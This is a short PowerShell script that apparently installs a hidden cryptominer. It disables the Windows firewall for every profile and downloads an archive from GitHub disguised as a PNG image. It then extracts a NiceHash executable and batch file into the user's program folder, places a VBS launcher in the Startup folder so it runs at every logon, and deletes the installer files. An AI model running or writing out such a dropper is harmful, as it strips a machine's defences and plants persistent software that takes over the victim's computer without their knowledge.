Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
cd $env:TEMP
Invoke-WebRequest "https://github.com/YinYangERROR/nh2/raw/main/Install.png" -OutFile "Install.zip"
Expand-Archive .\Install.zip .\
rm .\Install.zip -Force
cd Install
md $env:LOCALAPPDATA\Programs\NiceHash` Miner 2> $null
mv NiceHash.exe $env:LOCALAPPDATA\Programs\NiceHash` Miner\NiceHash.exe -Force
mv nicehash-start.vbs $env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\nicehash-start.vbs -Force
mv start.bat $env:LOCALAPPDATA\Programs\NiceHash` Miner\start.bat -Force
cd ..
rm Install -Recurse -Force
cd $env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup